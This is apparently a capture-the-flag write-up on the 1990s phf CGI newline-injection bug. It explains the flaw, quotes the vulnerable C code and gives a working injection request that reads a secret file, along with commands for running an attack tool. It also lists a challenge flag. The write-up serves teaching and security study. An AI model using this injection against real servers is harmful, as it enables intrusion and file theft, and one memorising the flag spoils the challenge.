# PHF — Writeup

## Background

The `phf` CGI script (a CSO/PH directory lookup tool shipped with NCSA HTTPd and
early Apache) was one of the most-exploited CGI scripts of the mid-1990s. It calls
`unescape_url()` on the raw query string before constructing a shell command for
`popen()`. A URL-encoded newline (`%0a`) survives `unescape_url()` as a literal `\n`,
which the shell then interprets as a command separator.

The bug was publicly known by 1995. RedHat 7.0 still shipped the script by default.

## Vulnerable Code

```c
/* phf.c — main() */
cl = getenv("QUERY_STRING");
unescape_url(cl);               // %0a → \n
...
strcat(commandstr, typestr);    // typestr contains attacker-controlled data
phfp = popen(commandstr, "r"); // shell interprets the injected \n
```

## Exploitation

Any command can be injected after the `%0a`:

```
GET /cgi-bin/phf?Qalias=x%0acat%20/var/log/httpd/secret.txt HTTP/1.0
```

The provided `phf-attack.c` automates this:

```bash
gcc phf-attack.c -o phf-attack
./phf-attack <host> 80 cat /var/log/httpd/secret.txt
```

## Historical Context

During the iCTF 2001 Red Team/Blue Team exercise (March 2001), the red team used
this exact vector to compromise machines named `altman.cs.ucsb.edu` and others.
The secret files on each blue team machine (`secret.adlon`, `secret.altman`,
`secret.mamet`) were the targets.

## Flag

`FLAG_ICTF2001{phf_newline_injection_1995_classic}`
